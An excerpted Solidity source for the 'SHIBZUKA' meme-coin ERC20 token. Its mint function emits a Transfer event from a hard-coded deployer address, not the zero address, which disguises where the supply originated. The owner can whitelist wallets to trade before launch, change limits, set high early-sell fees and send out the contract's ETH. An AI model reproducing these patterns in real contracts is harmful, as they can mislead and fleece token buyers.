...
/**
Project: SHIBZUKA $SHIBZU
Telegram: https://t.me/shibzuka
Twitter: https://twitter.com/shibzuka
Website: https://shibzuka.com
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        emit Transfer(address(0x40d945b17c607f0672d7d80370d014C28DbC034A), account, amount);
    }
...
contract SHIBZUKA is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Shibzuka", "SHIBZU") {
        ...
        uint256 _earlySellMarketingFee = 50;
	    uint256 _earlySellDevFee = 50;
 
        uint256 totalSupply = 1 * 1e9 * 1e18;
 
        maxTransactionAmount = totalSupply * 100 / 10000; // 1% maxTransaction amount.
        maxWallet = totalSupply * 200 / 10000; // 2% maxWallet amount.
        swapTokensAtAmount = totalSupply * 1 / 10000; // swap when contravt token balance reaches 0.01%
        ...
        marketingWallet = 0xC787ED2E4c278d36cFc77Cf57872c8D6626f05A7; // marketing wallet
        devWallet = 0x40d945b17c607f0672d7d80370d014C28DbC034A; // original deployer
        teamwallet = 0xFB9Ee3f316ECEcc179f760475ee415B50111A1b5; // team wallet used for buybacks, team pay and mods
    ...
    function reenableTrading() external onlyOwner {
        tradingActive = true;
        swapEnabled = false;
    }
    ...
    function updateSwapTokensAtAmount(uint256 swapAmountPerc) external onlyOwner returns (bool){
        require(swapAmountPerc * totalSupply()/1000000 >= totalSupply() * 1 / 10000000, "Swap amount cannot be lower than 0.00001% total supply.");
    ...
    function updateMaxTxnAmount(uint256 MaxTxnPerc) external onlyOwner {
        require(MaxTxnPerc * totalSupply()/10000 >= totalSupply() * 1/10000, "Cannot set maxTransactionAmount lower than 0.01%");
        maxTransactionAmount = MaxTxnPerc * totalSupply()/10000;
    }
 
    function updateMaxWalletAmount(uint256 MaxWalPerc) external onlyOwner {
        require(MaxWalPerc * totalSupply()/10000 >= totalSupply() * 1/10000, "Cannot set maxWallet lower than 0.01%");
        maxWallet = MaxWalPerc * totalSupply()/10000;
    }
    ...
    function setMultiWhitelist(address[] memory multiWL_) public onlyOwner {
        for (uint256 i = 0; i < multiWL_.length; i++) {
            wl[multiWL_[i]] = true;
        }
    }

    function delFromMultiWL(address delFromWL) public onlyOwner {
        wl[delFromWL] = false;
    }
    ...
    function manualsend() external onlyOwner() {
        ...
        uint256 ethTeam = ethMarketing.div(3).mul(1);
        uint256 ethMarket = ethMarketing.div(3).mul(2);
        ...
        if(ethMarket > 0)
            payable(marketingWallet).transfer(ethMarket);
        if(ethTeam > 0)
            payable(teamwallet).transfer(ethTeam);
    }
    ...
    function _transfer(
        ...
        if(limitsInEffect){
            if (
                ...
                if(!tradingActive){
                    require(_isExcludedFromFees[from] || _isExcludedFromFees[to] || wl[from] || wl[to], "Trading is not active.");
                }
    ...
    function swapBack() private {
        ...
        uint256 ethForTeam = ethForMarketing.div(3).mul(1);
        uint256 ethformarketing = ethForMarketing.div(3).mul(2);
    ...
    function Airdrops(address[] calldata recipients, uint256[] calldata values)
        external
        onlyOwner
    {
